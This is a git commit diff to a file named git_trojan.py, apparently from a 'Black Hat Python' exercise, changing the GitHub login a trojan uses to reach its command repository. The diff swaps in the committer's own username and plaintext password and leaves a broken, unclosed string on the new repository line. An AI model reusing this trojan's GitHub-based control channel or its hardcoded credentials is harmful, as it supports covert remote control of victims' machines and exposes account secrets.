f629f5331e2a061b26de7930705f217f1612efcf
MSUGino90 <41445015+MSUGino90@users.noreply.github.com>
2018-07-19 13:21:59 -0400

    Add files via upload

--- modules/git_trojan.py
+++ modules/git_trojan.py
@@ -52,8 +52,8 @@ class GitImporter(object):
 
 
 def connect_to_github():
-    gh = login(username="blackhatpythonbook",password="justin1234")
-    repo = gh.repository("blackhatpythonbook","chapter7")
+    gh = login(username="MSUGino90",password="bacon2018")
+    repo = gh.repository("MSUGino90,"chapter7")
     branch = repo.branch("master")    
 
     return gh,repo,branch
